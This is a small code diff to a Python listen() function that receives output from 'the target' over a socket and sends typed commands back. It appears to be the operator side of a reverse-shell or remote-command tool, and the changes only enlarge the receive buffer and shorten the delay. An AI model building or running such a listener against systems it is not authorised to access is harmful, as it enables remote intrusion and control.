@@ -55,7 +55,7 @@ def listen():
     first = True
     while True:
         #Receive data from the target and get user input
-        ans = conn.recv(8192*2).decode()
+        ans = conn.recv(1024 * 128).decode()
         sys.stdout.write(ans)
         if first:
             command = "\r"
@@ -66,7 +66,7 @@ def listen():
         #Send command
         command += "\n"
         conn.send(command.encode())
-        time.sleep(1)
+        time.sleep(0.25)
 
         #Remove the output of the "input()" function
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
